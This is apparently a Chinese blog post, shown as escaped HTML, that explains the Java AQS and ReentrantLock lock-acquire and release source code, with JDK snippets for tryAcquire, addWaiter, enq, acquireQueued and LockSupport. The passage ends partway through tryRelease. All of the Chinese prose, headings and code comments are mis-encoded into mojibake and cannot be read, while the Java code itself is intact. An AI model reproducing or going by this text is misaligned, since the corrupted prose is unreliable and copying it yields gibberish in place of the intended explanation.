&lt;p&gt;é¦–å…ˆèŠ‚ç‚¹çš„çŠ¶æ€å€¼waitStatusé»˜è®¤æ˜¯0ï¼Œç„¶åä¸‹é¢å‡ ä¸ªå¸¸é‡æœ‰è‡ªå·±å…·ä½“çš„å«ä¹‰ã€‚&lt;br/&gt;&lt;code&gt;CANCELLED = 1ï¼›&lt;/code&gt; ä»£è¡¨çš„æ˜¯å½“å‰èŠ‚ç‚¹ä»åŒæ­¥é˜Ÿåˆ—ä¸­å–æ¶ˆï¼Œå½“timeoutæˆ–è¢«ä¸­æ–­ï¼ˆå“åº”ä¸­æ–­çš„æƒ…å†µä¸‹ï¼‰ï¼Œä¼šè§¦å‘å˜æ›´ä¸ºæ­¤çŠ¶æ€ï¼Œè¿›å…¥è¯¥çŠ¶æ€åçš„ç»“ç‚¹å°†ä¸ä¼šå†å˜åŒ–ã€‚&lt;br/&gt;&lt;code&gt;SIGNAL = -1ï¼›&lt;/code&gt; ä»£è¡¨åç»§èŠ‚ç‚¹å¤„äºç­‰å¾…çŠ¶æ€ã€‚åç»§ç»“ç‚¹å…¥é˜Ÿæ—¶ï¼Œä¼šå°†å‰ç»§ç»“ç‚¹çš„çŠ¶æ€æ›´æ–°ä¸ºSIGNALã€‚&lt;br/&gt;&lt;code&gt;CONDITION = -2;&lt;/code&gt; èŠ‚ç‚¹åœ¨ç­‰å¾…é˜Ÿåˆ—ä¸­ï¼ŒèŠ‚ç‚¹çº¿ç¨‹ç­‰å¾…åœ¨Conditionä¸Šï¼Œå½“å…¶ä»–çº¿ç¨‹å¯¹Conditionè°ƒç”¨äº† &lt;code&gt;signal()&lt;/code&gt;æ–¹æ³•åï¼Œè¯¥èŠ‚ç‚¹å°†ä¼šä»ç­‰å¾…é˜Ÿåˆ—ä¸­è½¬ç§»åˆ°åŒæ­¥é˜Ÿåˆ—ä¸­ï¼ŒåŠ å…¥åˆ°å¯¹åŒæ­¥çŠ¶æ€çš„è·å–ä¸­ã€‚&lt;br/&gt;&lt;code&gt;PROPAGATE = -3;&lt;/code&gt; è¡¨ç¤ºåœ¨å…±äº«æ¨¡å¼ä¸‹ï¼Œå‰ç»§èŠ‚ç‚¹åœ¨é‡Šæ”¾èµ„æºåä¼šå”¤é†’åç»§èŠ‚ç‚¹ï¼Œå¹¶å°†è¿™ç§å…±äº«æ¨¡å¼ä¼ æ’­ä¸‹å»ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡ä¸Šé¢å‡ ä¸ªå›ºå®šçš„å¸¸é‡å€¼ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºèŠ‚ç‚¹çŠ¶æ€ä¸­é€šå¸¸è´Ÿæ•°å€¼é€šå¸¸è¡¨ç¤ºèŠ‚ç‚¹å¤„äºæœ‰æ•ˆçš„ç­‰å¾…çŠ¶æ€ï¼Œè€Œæ­£æ•°å€¼ä»£è¡¨èŠ‚ç‚¹å·²ç»è¢«å–æ¶ˆäº†ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥AQSæºç ä¸­æœ‰å¾ˆå¤šåœ°æ–¹éƒ½ç”¨&lt;code&gt;waitStatus&amp;gt;0&lt;/code&gt;æˆ–&lt;code&gt;waitStatus&amp;lt;0&lt;/code&gt;è¿™ç§æ–¹å¼æ¥åˆ¤æ–­é˜Ÿåˆ—ä¸­èŠ‚ç‚¹çš„æ˜¯å¦æ­£å¸¸ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç‹¬å æ¨¡å¼ä¸‹ï¼Œåªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹å æœ‰é”èµ„æºï¼Œå…¶ä»–ç«äº‰èµ„æºçš„çº¿ç¨‹ï¼Œåœ¨ç«äº‰å¤±è´¥åéƒ½ä¼šè¿›å…¥åˆ°ç­‰å¾…é˜Ÿåˆ—ä¸­ï¼Œç­‰å¾…å æœ‰é”èµ„æºçš„çº¿ç¨‹é‡Šæ”¾é”ï¼Œç„¶åå†é‡æ–°è¢«å”¤é†’ç«äº‰èµ„æºã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;reentrantlockåŠ é”è¿‡ç¨‹&quot;&gt;ReentrantLockåŠ é”è¿‡ç¨‹&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ReentrantLock&lt;/code&gt;é»˜è®¤æ˜¯éå…¬å¹³é”ï¼Œå°±æ˜¯è¯´ï¼Œçº¿ç¨‹åœ¨ç«äº‰é”çš„æ—¶å€™å¹¶ä¸æ˜¯æŒ‰ç…§å…ˆæ¥ååˆ°çš„é¡ºåºæ¥è·å–é”çš„ï¼Œä½†æ˜¯&lt;code&gt;ReentrantLock&lt;/code&gt;ä¹Ÿæ˜¯æ”¯æŒå…¬å¹³é”çš„ï¼Œåœ¨åˆ›å»ºçš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå‚æ•°å€¼å³å¯ã€‚&lt;br/&gt;ä¸‹é¢æˆ‘ä»¬ä»¥&lt;code&gt;ReentrantLock&lt;/code&gt;é»˜è®¤æƒ…å†µä¸‹çš„åŠ é”æ¥åˆ†æAQSçš„æºç ã€‚&lt;br/&gt;&lt;code&gt;ReentrantLock&lt;/code&gt;å¹¶æ²¡æœ‰ç›´æ¥ç»§æ‰¿AQSç±»ï¼Œè€Œæ˜¯é€šè¿‡å†…éƒ¨ç±»æ¥ç»§æ‰¿AQSç±»çš„ï¼Œè¿™æ ·è‡ªå·±çš„å®ç°åŠŸèƒ½ï¼Œè‡ªå·±ç”¨ã€‚&lt;br/&gt;æˆ‘ä»¬åœ¨ç”¨&lt;code&gt;ReentrantLock&lt;/code&gt;åŠ é”çš„æ—¶å€™éƒ½æ˜¯è°ƒç”¨çš„ç”¨&lt;code&gt;lock()&lt;/code&gt;æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹é»˜è®¤éå…¬å¹³é”ä¸‹ï¼Œ&lt;code&gt;lock()&lt;/code&gt;æ–¹æ³•çš„æºç ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
 * Sync object for non-fair locks
 */
static final class NonfairSync extends Sync {
    private static final long serialVersionUID = 7316153563782823691L;

    /**
     * Performs lock.  Try immediate barge, backing up to normal
     * acquire on failure.
     */
    final void lock() {
        if (compareAndSetState(0, 1))
            setExclusiveOwnerThread(Thread.currentThread());
        else
            acquire(1);
    }

    protected final boolean tryAcquire(int acquires) {
        return nonfairTryAcquire(acquires);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;é€šè¿‡æºç å¯ä»¥çœ‹åˆ°ï¼Œ&lt;code&gt;lock()&lt;/code&gt;æ–¹æ³•ï¼Œé¦–å…ˆæ˜¯é€šè¿‡CASçš„æ–¹å¼æŠ¢å é”ï¼Œå¦‚æœæŠ¢å æˆåŠŸåˆ™å°†stateçš„å€¼è®¾ç½®ä¸º1ã€‚ç„¶åå°†å¯¹è±¡ç‹¬å çº¿ç¨‹è®¾ç½®ä¸ºå½“å‰çº¿ç¨‹ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected final void setExclusiveOwnerThread(Thread thread) {
    exclusiveOwnerThread = thread;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å¦‚æœæŠ¢å é”å¤±è´¥ï¼Œå°±ä¼šè°ƒç”¨&lt;code&gt;acquire()&lt;/code&gt;æ–¹æ³•ï¼Œè¿™ä¸ª&lt;code&gt;acquire()&lt;/code&gt;æ–¹æ³•çš„å®ç°å°±æ˜¯åœ¨AQSç±»ä¸­äº†ï¼Œè¯´æ˜å…·ä½“æŠ¢å é”å¤±è´¥åçš„é€»è¾‘ï¼ŒAQSå·²ç»è§„å®šå¥½äº†æ¨¡æ¿ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final void acquire(int arg) {
    if (!tryAcquire(arg) &amp;amp;&amp;amp;
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))
        selfInterrupt();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢å·²ç»ä»‹ç»äº†ï¼Œç‹¬å æ¨¡å¼æ˜¯éœ€è¦å®ç°&lt;code&gt;tryAcquire()&lt;/code&gt;æ–¹æ³•çš„ï¼Œè¿™é‡Œé¦–å…ˆå°±æ˜¯é€šè¿‡&lt;code&gt;tryAcquire()&lt;/code&gt;æ–¹æ³•æŠ¢å é”ï¼Œå¦‚æœæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›falseã€‚&lt;code&gt;tryAcquire()&lt;/code&gt;æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œæ˜¯åœ¨&lt;code&gt;ReentrantLock&lt;/code&gt;é‡Œé¢çš„ï¼ŒAQSç±»ä¸­é»˜è®¤æ˜¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸çš„ã€‚&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;é¦–å…ˆè·å–stateå€¼ï¼Œå¦‚æœstateå€¼ä¸º0ï¼Œè¯´æ˜æ— é”ï¼Œé‚£ä¹ˆé€šè¿‡CASå°è¯•åŠ é”ï¼ŒæˆåŠŸåï¼Œå°†ç‹¬å çº¿ç¨‹è®¾ç½®ä¸ºå½“å‰çº¿ç¨‹ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœstateå€¼ä¸ä¸º0ï¼Œå¹¶ä¸”å½“å‰çš„ç‹¬å çº¿ç¨‹å’Œå½“å‰çº¿ç¨‹ä¸ºåŒä¸€çº¿ç¨‹ï¼Œé‚£ä¹ˆstateé‡å…¥æ¬¡æ•°åŠ 1ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœstateå€¼ä¸ä¸º0ï¼Œå¹¶ä¸”å½“å‰çº¿ç¨‹ä¸æ˜¯ç‹¬å çº¿ç¨‹ï¼Œç›´æ¥è¿”å›falseã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected final boolean tryAcquire(int acquires) {
    return nonfairTryAcquire(acquires);
}
final boolean nonfairTryAcquire(int acquires) {
     final Thread current = Thread.currentThread();
     int c = getState();// è·å–stateå€¼
     if (c == 0) { 
     // å¦‚æœstateå€¼ä¸º0ï¼Œè¯´æ˜æ— é”ï¼Œé‚£ä¹ˆå°±é€šè¿‡casæ–¹å¼ï¼Œå°è¯•åŠ é”ï¼ŒæˆåŠŸåå°†ç‹¬å çº¿ç¨‹è®¾ç½®ä¸ºå½“å‰çº¿ç¨‹
         if (compareAndSetState(0, acquires)) {
             setExclusiveOwnerThread(current);
             return true;
         }
     }
     else if (current == getExclusiveOwnerThread()) { // å¦‚æœæ˜¯åŒä¸€ä¸ªçº¿ç¨‹å†æ¬¡æ¥è·å–é”ï¼Œé‚£ä¹ˆå°±å°†stateçš„å€¼è¿›è¡ŒåŠ 1å¤„ç†ï¼ˆå¯é‡å…¥é”çš„ï¼Œé‡å…¥æ¬¡æ•°ï¼‰ã€‚
         int nextc = c + acquires;
         if (nextc &amp;lt; 0) // overflow
             throw new Error(&quot;Maximum lock count exceeded&quot;);
         setState(nextc);
         return true;
     }
     return false;
 }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬ç»§ç»­æ¥çœ‹&lt;code&gt;acquire()&lt;/code&gt;æ–¹æ³•ï¼Œåœ¨æ‰§è¡Œå®Œ&lt;code&gt;tryAcquire()&lt;/code&gt;æ–¹æ³•åï¼Œå¦‚æœåŠ é”å¤±è´¥é‚£ä¹ˆå°±ä¼šæ‰§è¡Œ&lt;code&gt;addWaiter()&lt;/code&gt;æ–¹æ³•å’Œ&lt;code&gt;acquireQueued()&lt;/code&gt;ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯å°†ç«äº‰é”å¤±è´¥çš„çº¿ç¨‹æ”¾å…¥åˆ°ç­‰å¾…é˜Ÿåˆ—ä¸­ã€‚&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200927231220316.png#pic_center&quot; alt=&quot;åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;code&gt;addWaiter()&lt;/code&gt;æ–¹æ³•çš„æºç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private Node addWaiter(Node mode) {
        // ç”¨å‚æ•°æŒ‡å®šçš„æ¨¡å¼å°†å½“å‰çº¿ç¨‹å°è£…æˆé˜Ÿåˆ—ä¸­çš„èŠ‚ç‚¹ï¼ˆEXCLUSIVEã€ç‹¬å ã€‘ï¼ŒSHAREDã€å…±äº«ã€‘ï¼‰
    Node node = new Node(Thread.currentThread(), mode);
    // Try the fast path of enq; backup to full enq on failure
    Node pred = tail;
    // tailæ˜¯é˜Ÿåˆ—çš„å°¾éƒ¨èŠ‚ç‚¹ï¼Œåˆå§‹æ—¶é˜Ÿåˆ—ä¸ºç©ºï¼Œå°¾éƒ¨èŠ‚ç‚¹ä¸ºnullï¼Œç›´æ¥è°ƒç”¨enqå°†èŠ‚ç‚¹æ’å…¥é˜Ÿåˆ—
    if (pred != null) {
    // å°†å½“å‰çº¿ç¨‹èŠ‚ç‚¹çš„å‰çº§èŠ‚ç‚¹æŒ‡å‘é˜Ÿåˆ—çš„å°¾éƒ¨èŠ‚ç‚¹ã€‚
        node.prev = pred;
        // é€šè¿‡CASæ–¹å¼å°†èŠ‚ç‚¹æ’å…¥åˆ°é˜Ÿåˆ—ä¸­
        if (compareAndSetTail(pred, node)) {
        // æ’å…¥æˆåŠŸåï¼Œå°†åŸå…ˆçš„å°¾éƒ¨èŠ‚ç‚¹çš„åçº§èŠ‚ç‚¹æŒ‡å‘æ–°çš„å°¾éƒ¨èŠ‚ç‚¹
            pred.next = node;
            return node;
        }
    }
    // å¦‚æœå°¾éƒ¨èŠ‚ç‚¹ä¸ºç©ºæˆ–é€šè¿‡CASæ’å…¥é˜Ÿåˆ—å¤±è´¥åˆ™é€šè¿‡enqæ–¹æ³•æ’å…¥èŠ‚ç‚¹
    enq(node);
    return node;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;addWaiter()&lt;/code&gt;ä¸­ä¸»è¦åšäº†ä¸‰ä»¶äº‹ï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;å°†å½“å‰çº¿ç¨‹å°è£…æˆNodeã€‚&lt;/li&gt;
&lt;li&gt;åˆ¤æ–­é˜Ÿåˆ—ä¸­å°¾éƒ¨èŠ‚ç‚¹æ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ä¸ºç©ºï¼Œåˆ™å°†å½“å‰çº¿ç¨‹çš„NodeèŠ‚ç‚¹é€šè¿‡CASæ’å…¥åˆ°å°¾éƒ¨ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœå°¾éƒ¨èŠ‚ç‚¹ä¸ºç©ºæˆ–CASæ’å…¥å¤±è´¥åˆ™é€šè¿‡&lt;code&gt;enq()&lt;/code&gt;æ–¹æ³•æ’å…¥åˆ°é˜Ÿåˆ—ä¸­ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;é‚£ä¹ˆenqæ–¹æ³•æ˜¯åˆæ˜¯æ€ä¹ˆæ’å…¥èŠ‚ç‚¹çš„å‘¢ï¼Ÿ&quot;&gt;é‚£ä¹ˆenq()æ–¹æ³•æ˜¯åˆæ˜¯æ€ä¹ˆæ’å…¥èŠ‚ç‚¹çš„å‘¢ï¼Ÿ&lt;/h4&gt;
&lt;p&gt;enq()æ–¹æ³•æºç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private Node enq(final Node node) {
        // çœ‹åˆ°æ­»å¾ªç¯ï¼Œå°±æ˜ç™½æ˜¯é€šè¿‡è‡ªæ—‹å’¯
    for (;;) {
    // å½“tailèŠ‚ç‚¹ä¸ºç©ºæ—¶ç›´æ¥å°†å½“å‰èŠ‚ç‚¹è®¾ç½®æˆå°¾éƒ¨èŠ‚ç‚¹ï¼Œå¹¶æ’å…¥åˆ°é˜Ÿåˆ—ä¸­ï¼Œä»¥åŠè®¾ç½®å®ƒä¸ºheadèŠ‚ç‚¹ã€‚
        Node t = tail;
        if (t == null) { // Must initialize
            if (compareAndSetHead(new Node()))
                tail = head;
        } else {
        // è‹¥æ˜¯å› ä¸ºåœ¨addWaiter()æ–¹æ³•ä¸­æ’å…¥å¤±è´¥æˆ–ç¬¬äºŒæ¬¡è¿›å…¥å¾ªç¯ï¼Œé‚£ä¹ˆå°†å½“å‰çº¿ç¨‹çš„å‰çº§èŠ‚ç‚¹æŒ‡å‘å°¾éƒ¨èŠ‚ç‚¹ï¼Œå¹¶é€šè¿‡CASæ–¹å¼å°†å°¾éƒ¨èŠ‚ç‚¹æŒ‡å‘å½“å‰çº¿ç¨‹çš„èŠ‚ç‚¹ã€‚
            node.prev = t;
            if (compareAndSetTail(t, node)) {
                t.next = node;
                return t;
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å…¶å®enq()æ–¹æ³•ä¸»è¦å°±æ˜¯é€šè¿‡è‡ªæ—‹å°†æ•°æ®æ’å…¥åˆ°é˜Ÿåˆ—ä¸­çš„æ“ä½œï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;å½“é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œå°†å½“å‰èŠ‚ç‚¹è®¾ç½®ä¸ºå¤´èŠ‚ç‚¹å’Œå°¾èŠ‚ç‚¹ã€‚&lt;/li&gt;
&lt;li&gt;è¿›å…¥äºŒæ¬¡å¾ªç¯åï¼Œå°†nodeæ·»åŠ åˆ°å°¾éƒ¨ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;è¿™æ ·addWaiter()æ–¹æ³•å°±æ„é€ äº†ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå¹¶å°†å½“å‰çº¿ç¨‹æ·»åŠ åˆ°äº†é˜Ÿåˆ—ä¸­äº†ã€‚&lt;br/&gt;æˆ‘ä»¬å†å›åˆ°&lt;code&gt;acquire()&lt;/code&gt;æ–¹æ³•ä¸­ã€‚&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200927231220316.png#pic_center&quot; alt=&quot;åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;ç°åœ¨å°±å‰©ä¸‹&lt;code&gt;acquireQueued()&lt;/code&gt;æ–¹æ³•æ²¡çœ‹äº†ï¼Œè¿™ä¸ªæ–¹æ³•ä¸­çš„æ“ä½œæŒºå¤šçš„ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final boolean acquireQueued(final Node node, int arg) {
    boolean failed = true;
    try {
        boolean interrupted = false;
        for (;;) {
        // è·å–å‰çº§èŠ‚ç‚¹ï¼Œå¦‚æœæœªnullï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸
            final Node p = node.predecessor();
        // å¦‚æœå‰çº§èŠ‚ç‚¹ä¸ºheadï¼Œå¹¶ä¸”æ‰§è¡ŒæŠ¢å é”æˆåŠŸã€‚
            if (p == head &amp;amp;&amp;amp; tryAcquire(arg)) {
            // æŠ¢å é”æˆåŠŸï¼Œå½“å‰èŠ‚ç‚¹æˆåŠŸæ–°çš„headèŠ‚ç‚¹
                setHead(node);
                // ç„¶åå°†åŸå…ˆçš„headèŠ‚ç‚¹æŒ‡å‘nullï¼Œæ–¹ä¾¿åƒåœ¾å›æ”¶è¿›è¡Œå›æ”¶
                p.next = null; // help GC
                failed = false;
                return interrupted;
            }
            // å¦‚æœå½“å‰èŠ‚ç‚¹ä¸ä¸ºhead,æˆ–è€…æŠ¢å é”å¤±è´¥ã€‚å°±æ ¹æ®èŠ‚ç‚¹çš„çŠ¶æ€å†³å®šæ˜¯å¦éœ€è¦æŒ‚èµ·çº¿ç¨‹ã€‚
            if (shouldParkAfterFailedAcquire(p, node) &amp;amp;&amp;amp;
                parkAndCheckInterrupt())
                interrupted = true;
        }
    } finally {
        if (failed) // å¦‚æœè·å–é”å¼‚å¸¸ï¼Œåˆ™å‡ºå–æ¶ˆè·å–é”æ“ä½œã€‚
            cancelAcquire(node);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final Node predecessor() throws NullPointerException {
    Node p = prev;
    if (p == null)
        throw new NullPointerException();
    else
        return p;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;é¦–å…ˆè·å–èŠ‚ç‚¹çš„å‰çº§èŠ‚ç‚¹ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœå½“å‰èŠ‚ç‚¹çš„å‰çº§èŠ‚ç‚¹æ˜¯headé‚£ä¹ˆå°±å¯ä»¥å»æŠ¢å é”äº†ã€‚&lt;/li&gt;
&lt;li&gt;æŠ¢å æˆåŠŸåå°±å°†æ–°èŠ‚ç‚¹è®¾ç½®ä¸ºheadï¼ŒåŸå…ˆçš„headç½®ä¸ºç©ºã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœæŠ¢å é”å¤±è´¥ï¼Œåˆ™æ ¹æ®&lt;code&gt;waitStatus&lt;/code&gt;å€¼å†³å®šæ˜¯å¦æŒ‚èµ·çº¿ç¨‹ã€‚&lt;/li&gt;
&lt;li&gt;æœ€åï¼Œé€šè¿‡&lt;code&gt;cancelAcquire()&lt;/code&gt;å–æ¶ˆè·å–é”æ“ä½œã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;ä¸‹é¢çœ‹ä¸€ä¸‹&lt;code&gt;shouldParkAfterFailedAcquire()&lt;/code&gt;å’Œ&lt;code&gt;parkAndCheckInterrupt()&lt;/code&gt;è¿™ä¸¤ä¸ªæ–¹æ³•æ˜¯å¦‚ä½•æŒ‚èµ·çº¿ç¨‹çš„ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private static boolean shouldParkAfterFailedAcquire(Node pred, Node node) {
    int ws = pred.waitStatus;// è·å–å‰çº§èŠ‚ç‚¹
    if (ws == Node.SIGNAL)// å¦‚æœå‰çº§èŠ‚ç‚¹çš„waitStatuså€¼ä¸ºSIGNAL(-1),è¯´æ˜å½“å‰èŠ‚ç‚¹ä¹Ÿå·²ç»åœ¨ç­‰å¾…å”¤é†’äº†ï¼Œç›´æ¥è¿”å›trueã€‚
        return true;
  // å¦‚æœå‰çº§èŠ‚ç‚¹çš„waitStatuså€¼å¤§äº0è¯´æ˜å‰çº§èŠ‚ç‚¹å·²ç»å–æ¶ˆäº†ã€‚
    if (ws &amp;gt; 0) {
   // å¦‚æœå‰çº§èŠ‚ç‚¹å·²ç»æ˜¯CANCELçŠ¶æ€äº†ï¼Œé‚£ä¹ˆä¼šç»§ç»­å‘å‰æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°çš„èŠ‚ç‚¹ä¸æ˜¯CANCELï¼ˆwaitStatue&amp;gt;0ï¼‰çŠ¶æ€çš„èŠ‚ç‚¹ï¼Œç„¶åå°†å…¶è®¾ç½®ä¸ºå½“å‰èŠ‚ç‚¹çš„å‰çº§èŠ‚ç‚¹ã€‚
        do {
            node.prev = pred = pred.prev;
        } while (pred.waitStatus &amp;gt; 0);
        pred.next = node;
    } else {
    // å¦‚æœå‰çº§èŠ‚ç‚¹ä¸º0æˆ–è€…å…¶ä»–ä¸ä¸º-1çš„å°äº0çš„å€¼ï¼Œåˆ™å°†å½“å‰èŠ‚ç‚¹çš„å‰çº§èŠ‚ç‚¹è®¾ç½®ä¸º SIGNAL(-1)
        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);
    }
    return false;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;parkAndCheckInterrupt()&lt;/code&gt;æ–¹æ³•çš„ä½œç”¨å°±æ˜¯æŒ‚èµ·çº¿ç¨‹ï¼Œå¦‚æœ&lt;code&gt;shouldParkAfterFailedAcquire()&lt;/code&gt;æ–¹æ³•æˆåŠŸï¼Œä¼šæ‰§è¡Œ&lt;code&gt;parkAndCheckInterrupt()&lt;/code&gt;æ–¹æ³•ï¼Œå®ƒé€šè¿‡&lt;code&gt;LockSupportçš„park()&lt;/code&gt;æ–¹æ³•ï¼Œå°†å½“å‰çº¿ç¨‹æŒ‚èµ·ï¼ˆWAITINGï¼‰ï¼Œå®ƒéœ€è¦&lt;code&gt;unpark()&lt;/code&gt;æ–¹æ³•å”¤é†’å®ƒï¼Œé€šè¿‡è¿™æ ·ä¸€ç§FIFOæœºåˆ¶çš„ç­‰å¾…ï¼Œæ¥å®ç°Lockæ“ä½œã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private final boolean parkAndCheckInterrupt() {
    LockSupport.park(this);
    return Thread.interrupted();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;LockSupport&lt;/code&gt;æ˜¯JDKä»1.6å¼€å§‹æä¾›çš„ä¸€ä¸ªçº¿ç¨‹åŒæ­¥æºè¯­å·¥å…·ç±»ï¼Œåœ¨è¿™é‡Œä¸»è¦ç”¨åˆ°äº†å®ƒçš„ä¸¤ä¸ªæ–¹æ³•ï¼ŒæŒ‚èµ·çº¿ç¨‹å’Œå”¤é†’çº¿ç¨‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void park() {
    UNSAFE.park(false, 0L);
}
public static void unpark(Thread thread) {
    if (thread != null)
        UNSAFE.unpark(thread);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;LockSupport&lt;/code&gt;çš„æŒ‚èµ·å’Œå”¤é†’çº¿ç¨‹éƒ½æ˜¯ä¸å¯é‡å…¥çš„ï¼Œå®ƒç”±ä¸€ä¸ªè®¸å¯æ ‡å¿—ï¼Œå½“è°ƒç”¨park()æ—¶å°±ä¼šå°†è®¸å¯è®¾ç½®ä¸º0ï¼ŒæŒ‚èµ·çº¿ç¨‹ï¼Œå¦‚æœå†è°ƒç”¨ä¸€æ¬¡&lt;code&gt;park()&lt;/code&gt;ï¼Œä¼šé˜»å¡çº¿ç¨‹ã€‚å½“è°ƒç”¨&lt;code&gt;unpark()&lt;/code&gt;æ—¶æ‰ä¼šå°†è®¸å¯æ ‡å¿—è®¾ç½®æˆ1ã€‚&lt;/p&gt;
&lt;h3 id=&quot;reentrantlocké‡Šæ”¾é”è¿‡ç¨‹&quot;&gt;ReentrantLocké‡Šæ”¾é”è¿‡ç¨‹&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ReentrantLock&lt;/code&gt;é‡Šæ”¾é”çš„è¿‡ç¨‹ä¸»è¦æœ‰ä¸¤ä¸ªé˜¶æ®µï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;é‡Šæ”¾é”ã€‚&lt;/li&gt;
&lt;li&gt;å”¤é†’æŒ‚èµ·çš„çº¿ç¨‹ã€‚&lt;br/&gt;&lt;code&gt;unlock()&lt;/code&gt;æ–¹æ³•çš„æºç å¦‚ä¸‹ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void unlock() {
   sync.release(1);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;é‡Šæ”¾é”çš„æ–¹æ³•æ˜¯å†™åœ¨çˆ¶ç±»ï¼Œ&lt;code&gt;AbstractQueuedSynchronizer&lt;/code&gt;ç±»ä¸­çš„ã€‚&lt;br/&gt;æºç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// é‡Šæ”¾ç‹¬å æ¨¡å¼ä¸‹çš„é”èµ„æº
public final boolean release(int arg) {
    if (tryRelease(arg)) { // å°è¯•é‡Šæ”¾èµ„æº
        Node h = head;
  //é‡Šæ”¾æˆåŠŸåï¼Œåˆ¤æ–­å¤´èŠ‚ç‚¹çš„çŠ¶æ€æ˜¯å¦ä¸ºæ— é”çŠ¶æ€ï¼Œå¦‚æœä¸ä¸ºæ— é”çŠ¶æ€å°±å°†å¤´èŠ‚ç‚¹ä¸­çš„çº¿ç¨‹å”¤é†’ã€‚
        if (h != null &amp;amp;&amp;amp; h.waitStatus != 0)
            unparkSuccessor(h);
        return true;
    }
    return false; // é‡Šæ”¾èµ„æºå¤±è´¥ï¼Œç›´æ¥è¿”å›false
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬é¦–å…ˆé‡Šæ”¾èµ„æºæ¥çœ‹&lt;code&gt;tryRelease()&lt;/code&gt;æ–¹æ³•çš„æºç ï¼Œçœ‹çœ‹é‡Šæ”¾èµ„æºæ˜¯æ€æ ·çš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected final boolean tryRelease(int releases) {
// ä»stateä¸­å‡å»ä¼ å…¥å‚æ•°çš„ç›¸åº”å€¼ï¼ˆä¸€èˆ¬ä¸º1ï¼‰
    int c = getState() - releases;
